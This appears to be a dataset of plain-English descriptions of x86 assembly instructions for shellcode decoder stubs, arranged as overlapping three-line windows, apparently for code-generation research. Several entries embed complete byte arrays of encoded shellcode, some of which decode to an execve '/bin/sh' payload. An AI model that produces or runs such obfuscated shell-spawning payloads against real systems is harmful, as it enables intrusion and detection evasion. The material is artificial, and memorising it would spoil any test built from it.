define the decoder function _BREAK store the encoded shellcode pointer in the esi register _BREAK zero out the ecx register
store the encoded shellcode pointer in the esi register _BREAK zero out the ecx register _BREAK move 25 in the lower 8 bits of the register cl
zero out the ecx register _BREAK move 25 in the lower 8 bits of the register cl _BREAK define the decode label
move 25 in the lower 8 bits of the register cl _BREAK define the decode label _BREAK subtract 8 from the curent byte of the shellcode
define the decode label _BREAK subtract 8 from the curent byte of the shellcode _BREAK negate the byte of the shellcode
subtract 8 from the curent byte of the shellcode _BREAK negate the byte of the shellcode _BREAK point to the next byte in esi
negate the byte of the shellcode _BREAK point to the next byte in esi _BREAK decrement the counter and jump to the decode label if is not zero
point to the next byte in esi _BREAK decrement the counter and jump to the decode label if is not zero _BREAK jump short to the EncodedShellcode label
decrement the counter and jump to the decode label if is not zero _BREAK jump short to the EncodedShellcode label _BREAK define the call_shellcode label
jump short to the EncodedShellcode label _BREAK define the call_shellcode label _BREAK call the decoder function
define the call_shellcode label _BREAK call the decoder function _BREAK define the array of bytes EncodedShellcode and initialize it to 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87
jump short to the call_decoder _BREAK define the decoder function _BREAK load the address of esi into edi
 define the decoder function _BREAK load the address of esi into edi _BREAK clear the eax
 load the address of esi into edi _BREAK clear the eax _BREAK clear the ebx
clear the eax _BREAK clear the ebx _BREAK define the switch function
clear the ebx _BREAK define the switch function _BREAK move the byte at the address esi + eax into bl
define the switch function _BREAK move the byte at the address esi + eax into bl _BREAK compare bl and 0xaa
move the byte at the address esi + eax into bl _BREAK compare bl and 0xaa _BREAK jump to xordecode if bl is zero
 compare bl and 0xaa _BREAK jump to xordecode if bl is zero _BREAK compare bl and 0xbb
jump to xordecode if bl is zero _BREAK compare bl and 0xbb _BREAK if bl is zero jump to xordecode
compare bl and 0xbb _BREAK if bl is zero jump to xordecode _BREAK jump notdecode
if bl is zero jump to xordecode _BREAK jump notdecode _BREAK define xordecode
jump notdecode _BREAK define xordecode _BREAK move the byte at the address esi + eax +1 into bl
define xordecode _BREAK move the byte at the address esi + eax +1 into bl _BREAK move bl into the byte in edi
move the byte at the address esi + eax +1 into bl _BREAK move bl into the byte in edi _BREAK perform xor operation between the byte in edi with 0xDD
 move bl into the byte in edi _BREAK perform xor operation between the byte in edi with 0xDD _BREAK point to the next byte in edi
perform xor operation between the byte in edi with 0xDD _BREAK point to the next byte in edi _BREAK add 3 to al
point to the next byte in edi _BREAK add 3 to al _BREAK jump short to switch
add 3 to al _BREAK jump short to switch _BREAK notdecode function
jump short to switch _BREAK notdecode function _BREAK move the byte at the address esi + eax +1 into bl
notdecode function _BREAK move the byte at the address esi + eax +1 into bl _BREAK move bl into the byte in edi
move the byte at the address esi + eax +1 into bl _BREAK move bl into the byte in edi _BREAK negate the byte in edi
move bl into the byte in edi _BREAK negate the byte in edi _BREAK increment edi
negate the byte in edi _BREAK increment edi _BREAK add 3 to al
increment edi _BREAK add 3 to al _BREAK jump short to switch
add 3 to al _BREAK jump short to switch _BREAK define call_decoder
jump short to switch _BREAK define call_decoder _BREAK call the decoder function
define call_decoder _BREAK call the decoder function _BREAK shellcode is array of bytes 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa
define the decoder function _BREAK store the encoded shellcode pointer in the esi register _BREAK load the address at esi + 13 into edi 
store the encoded shellcode pointer in the esi register _BREAK load the address at esi + 13 into edi _BREAK clear ecx
load the address at esi + 13 into edi _BREAK clear ecx _BREAK point edx to the stack pointer
clear ecx _BREAK point edx to the stack pointer _BREAK move 13 to cl
point edx to the stack pointer _BREAK move 13 to cl _BREAK function decode
move 13 to cl _BREAK function decode _BREAK get the byte from esi and save it in bl
function decode _BREAK get the byte from esi and save it in bl _BREAK decrease ebx by 1
get the byte from esi and save it in bl _BREAK decrease ebx by 1 _BREAK move bl into the byte in edx + eax
decrease ebx by 1 _BREAK move bl into the byte in edx + eax _BREAK point to the next byte in eax
move bl into the byte in edx + eax _BREAK point to the next byte in eax _BREAK get the byte from edi and save it in bl
point to the next byte in eax _BREAK get the byte from edi and save it in bl _BREAK decrease ebx by 1
get the byte from edi and save it in bl _BREAK decrease ebx by 1 _BREAK move bl into the byte at the address edx + eax
decrease ebx by 1 _BREAK move bl into the byte at the address edx + eax _BREAK point to the next byte in eax
move bl into the byte at the address edx + eax _BREAK point to the next byte in eax _BREAK point to the next byte in esi
point to the next byte in eax _BREAK point to the next byte in esi _BREAK point to the next byte in edi
point to the next byte in esi _BREAK point to the next byte in edi _BREAK decrement the counter and jump to decode if not zero
point to the next byte in edi _BREAK decrement the counter and jump to decode if not zero _BREAK jump to edx
decrement the counter and jump to decode if not zero _BREAK jump to edx _BREAK define the call_shellcode function
jump to edx _BREAK define the call_shellcode function _BREAK call decoder
define the call_shellcode function _BREAK call decoder _BREAK define the array of bytes EncodedShellcode and initialize to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
store the encoded shellcode pointer in the esi register _BREAK load the address of esi+0x1 into edi _BREAK clear the eax register
load the address of esi+0x1 into edi _BREAK clear the eax register _BREAK move 0x1 in the lowest byte of the register al
clear the eax register _BREAK move 0x1 in the lowest byte of the register al _BREAK zero out the ebx register
move 0x1 in the lowest byte of the register al _BREAK zero out the ebx register _BREAK decode function
zero out the ebx register _BREAK decode function _BREAK move the byte at the address esi+eax*1 into bl
decode function _BREAK move the byte at the address esi+eax*1 into bl _BREAK perform xor between bl and 0xaa 
move the byte at the address esi+eax*1 into bl _BREAK perform xor between bl and 0xaa  _BREAK jump to EncodedShellcode if bl  is not zero
perform xor between bl and 0xaa  _BREAK jump to EncodedShellcode if the result of xor between bl and 0xaa is not zero _BREAK move the byte at the address esi+eax*1 into bl 
jump to EncodedShellcode if the result of xor between bl and 0xaa is not zero _BREAK move the byte at the address esi+eax*1 into bl  _BREAK move bl into the byte in edi
move the byte at the address esi+eax*1 into bl  _BREAK move bl into the byte in edi _BREAK point to the next byte in edi
move bl into the byte in edi _BREAK point to the next byte in edi _BREAK add 0x2 to al
point to the next byte in edi _BREAK add 0x2 to al _BREAK jump to decode
add 0x2 to al _BREAK jump to decode _BREAK define call_decoder 
jump to decode _BREAK define call_decoder _BREAK call decoder function
define call_decoder _BREAK call decoder function _BREAK define the array of bytes EncodedShellcode and initialize to \xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb
define the decoder function _BREAK store the encoded shellcode pointer in the esi register _BREAK zero out the ecx register
store the encoded shellcode pointer in the esi register _BREAK zero out the ecx register _BREAK move 0x19 into the cl
zero out the ecx register _BREAK move 0x19 into the cl _BREAK define the decoder function
move 0x19 into the cl _BREAK define the decoder function _BREAK perform the xor operation between the byte in esi and the 0xaa value
define the decoder function _BREAK perform the xor operation between the byte in esi and the 0xaa value _BREAK point to the next byte in esi
perform the xor operation between the byte in esi and the 0xaa value _BREAK point to the next byte in esi _BREAK decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero
point to the next byte in esi _BREAK decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero _BREAK jump short to the Shellcode label
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero _BREAK jump short to the Shellcode label _BREAK define the call_decoder label
jump short to the Shellcode label _BREAK define the call_decoder label _BREAK call the decoder function
define the call_decoder label _BREAK call the decoder function _BREAK define the array of bytes Shellcode and initialize it to 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
store the encoded shellcode pointer in the esi register _BREAK zero out the ecx register _BREAK move 0x19 into cl
zero out the ecx register _BREAK move 0x19 into cl _BREAK define the decoder function
move 0x19 into cl _BREAK define the decoder function _BREAK negate the byte in esi
define the decoder function _BREAK negate the byte in esi _BREAK point to the next byte in esi
negate the byte in esi _BREAK point to the next byte in esi _BREAK decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero
point to the next byte in esi _BREAK decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero _BREAK jump short to the EncodedShellcode label
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero _BREAK jump short to the EncodedShellcode label _BREAK define the call_decoder label
jump short to the EncodedShellcode label _BREAK define the call_decoder label _BREAK call the decoder function
define the call_decoder label _BREAK call the decoder function _BREAK define the array of bytes EncodedShellcode and initialize it to 0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
point to the next word in esi _BREAK point to the next word in esi _BREAK move esi into bx
point to the next word in esi _BREAK move esi into bx _BREAK point to the next word in esi
move esi into bx _BREAK point to the next word in esi _BREAK point to the next word in esi
point to the next word in esi _BREAK point to the next word in esi _BREAK push the stack onto esi 
point to the next word in esi _BREAK push the stack onto esi _BREAK move the contents on edi
push the stack onto esi _BREAK move the contents on edi _BREAK main function
move the contents on edi _BREAK main function _BREAK move esi into ax
main function _BREAK move esi into ax _BREAK perform xor between ax and bx
move esi into ax _BREAK perform xor between ax and bx _BREAK jump to call decoded if ax is zero
perform xor between ax and bx _BREAK jump to call decoded if ax is zero _BREAK shift right ax by the contents of cl
jump to call decoded if ax is zero _BREAK shift right ax by the contents of cl _BREAK negate the word in ax
shift right ax by the contents of cl _BREAK negate the word in ax _BREAK move al into edi
negate the word in ax _BREAK move al into edi _BREAK point to the next word in esi
move al into edi _BREAK point to the next word in esi _BREAK point to the next word in esi
point to the next word in esi _BREAK point to the next word in esi _BREAK point to the next byte in edi
point to the next word in esi _BREAK point to the next byte in edi _BREAK jump short to main
point to the next byte in edi _BREAK jump short to main _BREAK define call_decoded
jump short to main _BREAK define call_decoded _BREAK execute call_decoded
define call_decoded _BREAK execute call_decoded _BREAK define enc function
execute call_decoded _BREAK define enc function _BREAK call decoder
define enc function _BREAK call decoder _BREAK define encoded as array of words 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539
store encoded_shellcode pointer in ESI _BREAK push encoded_shellcode pointer to stack for later execution _BREAK move encoded_shellcode pointer to EDI
push encoded_shellcode pointer to stack for later execution _BREAK move encoded_shellcode pointer to EDI _BREAK decode routine
move encoded_shellcode pointer to EDI _BREAK decode routine _BREAK move current word from encoded_shellcode to AX
decode routine _BREAK move current word from encoded_shellcode to AX _BREAK XOR encoded_shellcode with 1337, one word at a time
move current word from encoded_shellcode to AX _BREAK XOR encoded_shellcode with 1337, one word at a time _BREAK if ax is zero jump to decoded_shellcode
XOR encoded_shellcode with 1337, one word at a time _BREAK if ax is zero jump to decoded_shellcode _BREAK shift encoded_shellcode to right by one bit, one word at a time
if ax is zero jump to decoded_shellcode _BREAK shift encoded_shellcode to right by one bit, one word at a time _BREAK substract 13 from encoded_shellcode, one word at a time
shift encoded_shellcode to right by one bit, one word at a time _BREAK substract 13 from encoded_shellcode, one word at a time _BREAK move decoded byte to EDI
substract 13 from encoded_shellcode, one word at a time _BREAK move decoded byte to EDI _BREAK point to the next encoded_shellcode word
move decoded byte to EDI _BREAK point to the next encoded_shellcode word _BREAK point to the next encoded_shellcode word
point to the next encoded_shellcode word _BREAK point to the next encoded_shellcode word _BREAK point to the next decoded_shellcode byte
point to the next encoded_shellcode word _BREAK point to the next decoded_shellcode byte _BREAK jump to decode and repeat the decoding process for the next word
point to the next decoded_shellcode byte _BREAK jump to decode and repeat the decoding process for the next word _BREAK define decoded_shellcode function
jump to decode and repeat the decoding process for the next word _BREAK define decoded_shellcode function _BREAK call decoded_shellcode function
define decoded_shellcode function _BREAK call decoded_shellcode function _BREAK define call_decoder
call decoded_shellcode function _BREAK define call_decoder _BREAK call decoder
define call_decoder _BREAK call decoder _BREAK define encoded_shellcode as array of words 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539
shellcode on ESI _BREAK zero out the loop counter _BREAK move shellcode_length in the first byte
zero out the loop counter _BREAK move shellcode_length in the first byte _BREAK define check_even_odd
move shellcode_length in the first byte _BREAK define check_even_odd _BREAK jump to even_number
define check_even_odd _BREAK jump to even_number _BREAK define odd_number
jump to even_number _BREAK define odd_number _BREAK left rotate the shellcode by one
define odd_number _BREAK left rotate the shellcode by one _BREAK jump short to inc_dec
left rotate the shellcode by one _BREAK jump short to inc_dec _BREAK define even_number
jump short to inc_dec _BREAK define even_number _BREAK right rotate the shellcode in esi by one
define even_number _BREAK right rotate the shellcode in esi by one _BREAK define inc_dec
right rotate the shellcode in esi by one _BREAK define inc_dec _BREAK next byte in the encoded shellcode
define inc_dec _BREAK next byte in the encoded shellcode _BREAK decrease the counter and jump to check_even_odd if not zero
next byte in the encoded shellcode _BREAK decrease the counter and jump to check_even_odd if not zero _BREAK jump short to shellcode
decrease the counter and jump to check_even_odd if not zero _BREAK jump short to shellcode _BREAK define call_shellcode
jump short to shellcode _BREAK define call_shellcode _BREAK call decoder function
define call_shellcode _BREAK call decoder function _BREAK define shellcode as array of bytes 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01
clear ecx register _BREAK decode function _BREAK move the byte at the addrss in esi+ecx+1 in bl
decode function _BREAK move the byte at the addrss in esi+ecx+1 in bl _BREAK subtract 0x7 from bl
move the byte at the addrss in esi+ecx+1 in bl _BREAK subtract 0x7 from bl _BREAK move bl into the byte in esi+ecx
subtract 0x7 from bl _BREAK move bl into the byte in esi+ecx _BREAK point to the next position in ecx
move bl into the byte in esi+ecx _BREAK point to the next position in ecx _BREAK compare al with cl
point to the next position in ecx _BREAK compare al with cl _BREAK if al is not zero jump short to decode
compare al with cl _BREAK if al is not zero jump short to decode _BREAK jump to shellcode
if al is not zero jump short to decode _BREAK jump to shellcode _BREAK define stage
jump to shellcode _BREAK define stage _BREAK call decoder function
define stage _BREAK call decoder function _BREAK define shellcode as array of bytes 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87
save the shellcode in esi _BREAK clear the counter _BREAK move 0x1e into cl
clear the counter _BREAK move 0x1e into cl _BREAK define decode function
move 0x1e into cl _BREAK define decode function _BREAK compare the byte in esi with 0x7
define decode function _BREAK compare the byte in esi with 0x7 _BREAK if the byte in esi is lower then 0x7 jump to lowbound
compare the byte in esi with 0x7 _BREAK if the byte in esi is lower then 0x7 jump to lowbound _BREAK subtract 0x7 from the byte in esi
if the byte in esi is lower then 0x7 jump to lowbound _BREAK subtract 0x7 from the byte in esi _BREAK jump to common_commands
subtract 0x7 from the byte in esi _BREAK jump to common_commands _BREAK lowbound label 
jump to common_commands _BREAK lowbound label _BREAK clear the ebx
lowbound label _BREAK clear the ebx _BREAK clear the edx
clear the ebx _BREAK clear the edx _BREAK move 0x7 to bl
clear the edx _BREAK move 0x7 to bl _BREAK move 0xff to dl
move 0x7 to bl _BREAK move 0xff to dl _BREAK increment dx by one
move 0xff to dl _BREAK increment dx by one _BREAK subtract the current byte of the shellcode from bl
increment dx by one _BREAK subtract the current byte of the shellcode from bl _BREAK subtract bx from dx
subtract the current byte of the shellcode from bl _BREAK subtract bx from dx _BREAK move dl into the byte in esi
subtract bx from dx _BREAK move dl into the byte in esi _BREAK define common_commands
move dl into the byte in esi _BREAK define common_commands _BREAK point to the next byte in esi
define common_commands _BREAK point to the next byte in esi _BREAK decrement the counter and jump to decode routine if it is not zero
point to the next byte in esi _BREAK decrement the counter and jump to decode routine if it is not zero _BREAK jump to Shellcode label
decrement the counter and jump to decode routine if it is not zero _BREAK jump to Shellcode label _BREAK define the function call_decoder
jump to Shellcode label _BREAK define the function call_decoder _BREAK in the function call_decoder call the decoder routine
define the function call_decoder _BREAK in the function call_decoder call the decoder routine _BREAK define Shellcode as array of bytes 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x89
move esi to edi _BREAK define decode function _BREAK move the current byte of the shellcode in the bl register
define decode function _BREAK move the current byte of the shellcode in the bl register _BREAK perform the xor between bl and 0xBB
move the current byte of the shellcode in the bl register _BREAK perform the xor between bl and 0xBB _BREAK jump to formatting if bl is zero
perform the xor between bl and 0xBB _BREAK jump to formatting if bl is zero _BREAK move the byte of the shellcode in cl
jump to formatting if bl is zero _BREAK move the byte of the shellcode in cl _BREAK perform xor between cl and 0xAA
move the byte of the shellcode in cl _BREAK perform xor between cl and 0xAA _BREAK jump to shift decode if the cl is zero
perform xor between cl and 0xAA _BREAK jump to shift decode if the cl is zero _BREAK point to the next byte of the shellcode
jump to shift decode if the cl is zero _BREAK point to the next byte of the shellcode _BREAK jump short to decode
point to the next byte of the shellcode _BREAK jump short to decode _BREAK define shift_decode routine
jump short to decode _BREAK define shift_decode routine _BREAK move the byte in esi+1 to dl
define shift_decode routine _BREAK move the byte in esi+1 to dl _BREAK shift right dl by 1
move the byte in esi+1 to dl _BREAK shift right dl by 1 _BREAK move dl into the byte in esi+1
shift right dl by 1 _BREAK move dl into the byte in esi+1 _BREAK point to the next byte of the shellcode
move dl into the byte in esi+1 _BREAK point to the next byte of the shellcode _BREAK jump short to decode
point to the next byte of the shellcode _BREAK jump short to decode _BREAK formatting label
jump short to decode _BREAK formatting label _BREAK move edi to eax
ormatting label _BREAK move edi to eax _BREAK move the byte in eax to bl
move edi to eax _BREAK move the byte in eax to bl _BREAK perform xor between bl and 0xBB
move the byte in eax to bl _BREAK perform xor between bl and 0xBB _BREAK jump to encoded if bl is zero
perform xor between bl and 0xBB _BREAK jump to encoded if bl is zero _BREAK define format routine
jump to encoded if bl is zero _BREAK define format routine _BREAK move the byte in eax to bl
define format routine _BREAK move the byte in eax to bl _BREAK move the byte in eax to cl
move the byte in eax to bl _BREAK move the byte in eax to cl _BREAK perform xor between cl and 0xAA
move the byte in eax to cl _BREAK perform xor between cl and 0xAA _BREAK jump to Next_Cycle if cl is not zero
perform xor between cl and 0xAA _BREAK jump to Next_Cycle if cl is not zero _BREAK define Cycle
jump to Next_Cycle if cl is not zero _BREAK define Cycle _BREAK move the byte at address eax to dl
define Cycle _BREAK move the byte at address eax to dl _BREAK perform xor between dl and 0xBB
move the byte at address eax to dl _BREAK perform xor between dl and 0xBB _BREAK jump to Next_Cycle if dl is zero
perform xor between dl and 0xBB _BREAK jump to Next_Cycle if dl is zero _BREAK move the byte at address eax+1 to dl
jump to Next_Cycle if dl is zero _BREAK move the byte at address eax+1 to dl _BREAK move dl at the address eax
move the byte at address eax+1 to dl _BREAK move dl at the address eax _BREAK point to the next byte in eax
move dl at the address eax _BREAK point to the next byte in eax _BREAK jump short to Cycle
point to the next byte in eax _BREAK jump short to Cycle _BREAK define the Next_Cycle function
jump short to Cycle _BREAK define the Next_Cycle function _BREAK increment edi by one
define the Next_Cycle function _BREAK increment edi by one _BREAK jump short to formatting
increment edi by one _BREAK jump short to formatting _BREAK define call_shellcode
jump short to formatting _BREAK define call_shellcode _BREAK call the decoder function
define call_shellcode _BREAK call the decoder function _BREAK encoded is the array of bytes 0xAA,0x62,0xc0,0xAA,0xa0,0xAA,0xd0,0xAA,0x5e,0xAA,0x5e,0xAA,0xe6,0xAA,0xd0,0xAA,0xd0,0xAA,0x5e,0xAA,0xc4,0xAA,0xd2,0xAA,0xdc,0x89,0xe3,0xAA,0xa0,0x89,0xe2,0xAA,0xa6,0x89,0xe1,0xb0,0xAA,0x16,0xcd,0x80,0xBB
zero out ecx _BREAK zero out edx _BREAK move 0x45 to dl
zero out edx _BREAK move 0x45 to dl _BREAK jump short to call_decoder
move 0x45 to dl _BREAK jump short to call_decoder _BREAK decoder routine
jump short to call_decoder _BREAK decoder routine _BREAK store the shellcode pointer to esi
decoder routine _BREAK store the shellcode pointer to esi _BREAK point edi to the start of the shellcode
store the shellcode pointer to esi _BREAK point edi to the start of the shellcode _BREAK decode function
point edi to the start of the shellcode _BREAK decode function _BREAK move the byte at the address edi+ecx into bl
decode function _BREAK move the byte at the address edi+ecx into bl _BREAK move bl to bh
move the byte at the address edi+ecx into bl _BREAK move bl to bh _BREAK move dl to al
move bl to bh _BREAK move dl to al _BREAK perform xor between al and bl
move dl to al _BREAK perform xor between al and bl _BREAK jump short to shellcode if al is zero
perform xor between al and bl _BREAK jump short to shellcode if al is zero _BREAK mov the word at the address edi+1+ecx into ax
jump short to shellcode if al is zero _BREAK mov the word at the address edi+1+ecx into ax _BREAK perform xor between ax and bx
mov the word at the address edi+1+ecx into ax _BREAK perform xor between ax and bx _BREAK move ax into the word in edi
perform xor between ax and bx _BREAK move ax into the word in edi _BREAK point to the next byte in ecx
move ax into the word in edi _BREAK point to the next byte in ecx _BREAK load the address of edi+2 into edi
point to the next byte in ecx _BREAK load the address of edi+2 into edi _BREAK jump short to decode
load the address of edi+2 into edi _BREAK jump short to decode _BREAK call_decoder label
jump short to decode _BREAK call_decoder label _BREAK call decoder
call_decoder label _BREAK call decoder _BREAK shellcode contains the bytes 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4
decoder's main _BREAK load address of our encoded shellcode (encoded_shellcode) into ESI _BREAK trick to clear eax and exc
load address of our encoded shellcode (encoded_shellcode) into ESI _BREAK trick to clear eax and exc _BREAK move 10 into the first byte of the counter
trick to clear eax and exc _BREAK move 10 into the first byte of the counter _BREAK decode_loop
move 10 into the first byte of the counter _BREAK decode_loop _BREAK load encoded_shellcode's byte pointed by ESI in al
decode_loop _BREAK load encoded_shellcode's byte pointed by ESI in al _BREAK swap al value with next byte value (ESI+1)
load encoded_shellcode's byte pointed by ESI in al _BREAK swap al value with next byte value (ESI+1) _BREAK move al into the value at the address esi
swap al value with next byte value (ESI+1) _BREAK move al into the value at the address esi _BREAK add 2 to the contents of esi
move al into the value at the address esi _BREAK add 2 to the contents of esi _BREAK decrement the counter and if it is not zero go back at decode_loop and execute the cicle again
add 2 to the contents of esi _BREAK decrement the counter and if it is not zero go back at decode_loop and execute the cicle again _BREAK jump to encoded_shellcode
decrement the counter and if it is not zero go back at decode_loop and execute the cicle again _BREAK jump to encoded_shellcode _BREAK define shellcode_section
jump to encoded_shellcode _BREAK define shellcode_section _BREAK go to decoder's main
define shellcode_section _BREAK go to decoder's main _BREAK enocoded_shellcode is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
zero out ecx _BREAK zero out edx _BREAK get the address of shellcode
zero out edx _BREAK get the address of shellcode _BREAK move 0xaaaa9090 to edi
get the address of shellcode _BREAK move 0xaaaa9090 to edi _BREAK subtract 0x7f from the stack
move 0xaaaa9090 to edi _BREAK subtract 0x7f from the stack _BREAK subtract 0x7f from the stack
subtract 0x7f from the stack _BREAK subtract 0x7f from the stack _BREAK subtract 0x7f from esp
subtract 0x7f from the stack _BREAK subtract 0x7f from esp _BREAK subtract 0x7f from esp
subtract 0x7f from esp _BREAK subtract 0x7f from esp _BREAK decode routine
subtract 0x7f from esp _BREAK decode routine _BREAK save the byte in esi+edx+1 in bl
decode routine _BREAK save the byte in esi+edx+1 in bl _BREAK save the byte in esi+edx+2 in bh
save the byte in esi+edx+1 in bl _BREAK save the byte in esi+edx+2 in bh _BREAK save the byte in esi+edx+3 in cl
save the byte in esi+edx+2 in bh _BREAK save the byte in esi+edx+3 in cl _BREAK save the byte in esi+edx+4 in ch
save the byte in esi+edx+3 in cl _BREAK save the byte in esi+edx+4 in ch _BREAK perform the xor between bl and the byte in esi+edx
save the byte in esi+edx+4 in ch _BREAK perform the xor between bl and the byte in esi+edx _BREAK perform the xor between bh and the byte in esi+edx
perform the xor between bl and the byte in esi+edx _BREAK perform the xor between bh and the byte in esi+edx _BREAK perform the xor between cl and the byte in esi+edx
perform the xor between bh and the byte in esi+edx _BREAK perform the xor between cl and the byte in esi+edx _BREAK perform the xor between ch and the byte in esi+edx
perform the xor between cl and the byte in esi+edx _BREAK perform the xor between ch and the byte in esi+edx _BREAK move ch into the byte in esp+eax
perform the xor between ch and the byte in esi+edx _BREAK move ch into the byte in esp+eax _BREAK move cl into the byte in esp+eax+1
move ch into the byte in esp+eax _BREAK move cl into the byte in esp+eax+1 _BREAK move bh into the byte in esp+eax+2
move cl into the byte in esp+eax+1 _BREAK move bh into the byte in esp+eax+2 _BREAK move bl into the byte in esp+eax+3
move bh into the byte in esp+eax+2 _BREAK move bl into the byte in esp+eax+3 _BREAK compare doubleword in esi+edx+5 with edi
move bl into the byte in esp+eax+3 _BREAK compare doubleword in esi+edx+5 with edi _BREAK if doubleword in esi+edx+5 is zero jump to execute_shellcode
compare doubleword in esi+edx+5 with edi _BREAK if doubleword in esi+edx+5 is zero jump to execute_shellcode _BREAK increment edx 
if doubleword in esi+edx+5 is zero jump to execute_shellcode _BREAK increment edx _BREAK increment edx
increment edx _BREAK increment edx _BREAK increment edx
increment edx _BREAK increment edx _BREAK increment edx
increment edx _BREAK increment edx _BREAK increment edx
increment edx _BREAK increment edx  _BREAK add 4 to eax
increment edx  _BREAK add 4 to eax _BREAK jump to decode if eax is not zero
add 4 to eax _BREAK jump to decode if eax is not zero _BREAK define execute_shelloce
